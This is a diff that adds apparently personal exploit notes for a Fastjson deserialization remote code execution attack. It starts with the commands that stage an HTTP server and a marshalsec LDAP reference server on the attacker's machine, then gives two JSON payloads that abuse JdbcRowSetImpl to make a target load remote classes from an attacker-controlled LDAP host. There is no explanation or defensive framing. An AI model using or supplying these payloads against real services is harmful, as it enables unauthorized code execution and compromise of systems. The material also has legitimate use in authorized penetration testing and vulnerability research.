@@ -1,0 +1,36 @@
+python3 -m http.server 80
+
+javac dnslog.java
+
+javac exp.java
+
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<本机IP地址>/#dnslog" 7777
+
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<本机IP地址>/#exp" 777
+
+
+{
+    "a":{
+        "@type":"java.lang.Class",
+        "val":"com.sun.rowset.JdbcRowSetImpl"
+    },
+    "b":{
+        "@type":"com.sun.rowset.JdbcRowSetImpl",
+        "dataSourceName":"ldap://<本机IP地址>:7777/dnslog",
+        "autoCommit":true
+    }
+}
+
+
+
+{
+    "a":{
+        "@type":"java.lang.Class",
+        "val":"com.sun.rowset.JdbcRowSetImpl"
+    },
+    "b":{
+        "@type":"com.sun.rowset.JdbcRowSetImpl",
+        "dataSourceName":"ldap://<本机IP地址>:7777/exp",
+        "autoCommit":true
+    }
+}
